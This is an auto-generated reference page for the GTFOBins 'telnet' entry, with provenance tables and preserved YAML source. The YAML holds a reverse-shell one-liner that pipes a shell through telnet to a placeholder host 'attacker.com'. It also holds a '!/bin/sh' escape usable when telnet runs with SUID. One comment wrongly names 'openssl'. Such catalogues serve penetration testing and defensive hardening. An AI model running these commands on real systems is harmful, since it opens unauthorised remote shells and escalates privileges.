---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# telnet

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `telnet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/telnet` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [telnet](../../tools/linux/telnet.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | telnet |
| name | telnet |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/telnet/ |

## Preserved Source Material

```yaml
_body: ''
_name: telnet
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/telnet
functions:
  reverse-shell:
  - code: 'mkfifo /path/to/temp-socket

      telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket'
    comment: The shell process is not spawn by `openssl`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'telnet

      !/bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
